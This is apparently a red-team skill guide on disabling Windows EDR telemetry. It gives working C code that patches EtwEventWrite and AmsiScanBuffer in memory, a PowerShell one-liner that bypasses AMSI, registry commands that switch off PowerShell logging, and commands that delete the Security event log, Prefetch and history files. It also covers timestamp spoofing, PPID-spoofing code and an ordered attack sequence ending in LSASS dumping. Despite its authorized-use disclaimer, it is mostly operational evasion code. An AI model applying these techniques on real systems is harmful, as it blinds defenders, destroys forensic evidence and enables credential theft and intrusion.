# Telemetry Blindness: ETW / AMSI / Reverse-Engineering

> This document is for authorized red teams,对抗演练, and proprietary product testing only. Do not use it for unauthorized targets.

The detection capabilities of EDR (Endpoint Detection and Response) heavily rely on the ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface) telemetry pipelines.
This document summarizes countermeasures against these two pipelines, along with Sysmon / PowerShell logging / timestamp spoofing, which are used in reverse engineering.

## 1. Internal Structure of ETW

ETW is a high-performance event tracing framework built into Windows, and EDR uses it for "lightweight kernel telemetry."
The red team is most concerned about the following providers:

| Provider GUID | Name | Who Uses It |
| -------------- | ---- | ----------- |
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDR |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | AMSI reports by Defender |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Base events for processes / threads |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT compilation |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | Startup of the CLR |

### Key User Mode APIs

| API | DLL | Functionality |
|-----|----|---------------|
| `EtwEventWrite` | `ntdll.dll` | Write an event (most commonly used) |
| `EtwEventWriteFull` | `ntdll.dll` | Event with activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | Underlying of EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | Control trace session (start/stop/query provider) |
| `EtwEventEnabled` | `ntdll.dll` | Whether the provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register a provider |

### Call Chain

```text
Application Code EventWrite(...)
  → Microsoft Envelope (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → Kernel ETW core → Consumer (EDR user-mode process subscribes to session)
```

## 2. ETW Patch Three Methods

### Method A: EtwEventWrite Head Patch

Directly modify the `ntdll!EtwEventWrite` entry to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

Patch After (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C Code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC Warning**: Writing to ntdll memory itself is an ETW-TI monitored event source for `ALPC_MODIFY_PROCESS` / `PROTECTVM`.
Must **first use indirect syscall and bypass NtProtectVirtualMemory hook**, then patch,
otherwise EDR will receive a warning before the patch takes effect.

### Method B: EtwEventEnabled Always-FALSE

More隐蔽：不修改 `EtwEventWrite`，而是让 `EtwEventEnabled` 永远返回 FALSE，
应用层会自己判断 "provider 没开" → 不调用 `EtwEventWrite`，对内存 hash 完整性检查更友好（很多 EDR 校验 `EtwEventWrite` 字节）。

```c
// EtwEventEnabled typically returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl Close Provider

Use syscall directly to close the EDR session (intrusive but doesn't touch ntdll bytes):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Requires SeSystemProfilePrivilege or higher
// Applicable for Local Admin + UAC bypass scenarios
```

Used less in practice because:

- Closing the session itself triggers an "ETW provider stopped" event being picked up by another pipeline.
- High privileges are required.

### Method D: Kernel Mode ETW Patch (Only When BYOVD/Kernel Read/Write Already Exists)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Directly set to 0 to discard all ETW-TI events
```

Belongs to the BYOVD phase of the attack chain, this skill is not further detailed.

## 3. AMSI Bypass

AMSI is the Windows interface provided for PowerShell / .NET / WMI / VBA to perform antivirus scans before executing scripts.

Red teams frequently encounter PowerShell + AMSI.

### Classic AmsiScanBuffer Patch

```c
// Entry point of amsi.dll's AmsiScanBuffer function:
//   mov eax, 0x80070057 ; E_INVALIDARG
//   ret 4               ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

A PowerShell one-liner version (for demonstration purposes only; the payload may be detected and blocked by antivirus or Defender):

```powershell
# Conceptual demonstration — must be paired with obfuscation / HWBP in real environment
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced Solution 1: Hardware Breakpoint AMSI Bypass

Avoid modifying the memory of amsi.dll (to avoid triggering integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the entry point of `AmsiScanBuffer`
3. When VEH hits, set `RAX = 0x80070057`, `RIP = address of ret instruction`, and `RSP += 8`
4. ContinueExecution

This approach shares the same infrastructure as Advanced Unhooking Techniques (HWBP Blindside), allowing for shared use of VEH.

### Advanced Solution 2: AmsiContext / AmsiSession Damage

Construct malformed `AmsiContext` structure to cause `AmsiScanBuffer` to prematurely return success due to validation failure internally:

```text
// The header of AmsiContext should be the "AMSI" magic number
// Change it to "XXXX" → AmsiScanBuffer returns S_OK + AMSI_RESULT_CLEAN internally without failing validation
```

### Advanced Solution 3: Reflective Loading of amsi.dll

Do not use the system's amsi.dll; instead, reflective-load a clean copy into your process and redirect PowerShell engine calls to AMSI.

This approach is suitable for advanced EDR that already intercepts the start of PowerShell.exe.

## 4. Forensic Countermeasures: Erasing Traces

### PowerShell ScriptBlock Logging 关闭

```powershell
# Registry (requires administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy Path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Requires SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Overall clear (large action, use with caution)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL log

```powershell
# Stop session to delete etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: Directly deleting .evtx will be recreated by the Event Log Service with an event ID 1102 indicating "log cleared"
# More stealthy: Memory patch of wevtsvc.dll's EventLog API (belonging to T1070.001)
```

### Time stamp spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 6. Sysmon Monitoring Mitigation

Sysmon is the most commonly used free telemetry by the community (many enterprises use Olaf to configure it).
Key Events:

| Event ID | Meaning |
|----------|---------|
| 1 | ProcessCreate (including PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL Load) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Mitigation Strategies

1. **No New Processes** — All actions are performed within the injected process, avoiding Event ID 1.
2. **PPID Spoof** — Use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set PPID to `explorer.exe`, making Sysmon's ProcessCreate see it as legitimate.

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked Memory + No Moving Image** — Process Hollowing is already captured by Event ID 25 in the newer Sysmon.
   Use **module stomping** (overwriting a section of a loaded legitimate DLL) or **dirty vanity** (a newer technique),
   combined with PPID spoof.
4. **No Remote Threads** — Avoid Event ID 8; use `NtCreateThreadEx` to execute / APC / Early Bird APC within the own process.
5. **DNS Use DoH/HTTPS** — Avoid Event ID 22

## 7. Call Stack Spoof + Timestamps to Make Events Look Like Legitimate Software

Even if ProcessCreate cannot be avoided (e.g., in certain scenarios where a child must be spawned), one can:

- Modify the CommandLine to resemble that of some legitimate software
- Set PPID spoof to `services.exe` (to mimic services started by SCM)
- Alter the Image hash seen by ImageLoad: By using **module stomping** to put implant code into a memory space of a signed DLL
- Pair with CallStackSpoofer: Sysmon, even if EnableCallTracing is enabled, will not see the frames of the implant.

## 7. Practical OPSEC: Execution Order

**The order is wrong and EDR will receive the alert first**, leading to subsequent actions being directly disabled.

Correct sequence:

```text
1. AMSI bypass (prefer HWBP, avoid writing amsi.dll)
   ─── Ensure .NET / PowerShell loads implant without scanning
2. ETW patch (patch EtwEventWrite before any syscall)
   ─── Disable telemetry for subsequent actions
3. NtProtectVirtualMemory using indirect syscall
   ─── Prepare a safe channel for memory permission switch
4. Unhook ntdll (Peruns Fart) or enable indirect syscall
   ─── Erase user-mode hooks
5. Call stack spoof setup
   ─── Prepare the pseudo-stack for all syscalls afterwards
6. Actual payload execution (injection / lateral movement / dump LSASS)
7. Clean traces (PowerShell history / Prefetch / timestamps)
```

Example of incorrect sequence:

```text
[FAIL] Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → SOC has already received the alert
[FAIL] Dump LSASS → AMSI / ETW haven't been suppressed yet → High-confidence T1003.001 alarm
[OK] AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- Overview of ETW Patching: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI Bypass Comprehensive Guide: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Route Callback

After completing the trio of hooks (research → unhook → telemetry suppression) in `SKILL.md` Step 5, validate it in the sandbox,
then proceed to the next phase following the initial access and lateral movement chapters in the `attack-chain/` section.